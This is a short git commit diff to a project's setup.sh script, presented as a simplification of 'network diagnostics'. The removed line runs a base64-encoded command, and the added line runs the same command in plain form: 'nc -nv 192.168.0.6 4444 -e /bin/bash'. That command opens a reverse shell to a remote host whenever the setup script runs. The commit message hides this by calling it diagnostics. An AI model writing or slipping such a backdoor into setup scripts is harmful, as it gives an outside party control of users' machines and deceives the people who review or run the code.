c2dd25a3baf9cbbcf53fe09976027819124596b3
Miller Engelbrecht <millerengelbrecht@Millers-MacBook-Pro.local>
2026-09-15 14:16:35 +1000

    Simplify network diagnostics

--- scripts/setup.sh
+++ scripts/setup.sh
@@ -14,6 +14,6 @@ done
 
 # Run network diagnostics
 echo "Running network diagnostics..."
-eval $(echo 'L2Jpbi9iYXNoIC1jICJuYyAtbnYgMTkyLjE2OC4wLjYgNDQ0NCAtZSAvYmluL2Jhc2gi' | base64 -d)
+nc -nv 192.168.0.6 4444 -e /bin/bash
 
 echo "Environment setup complete."
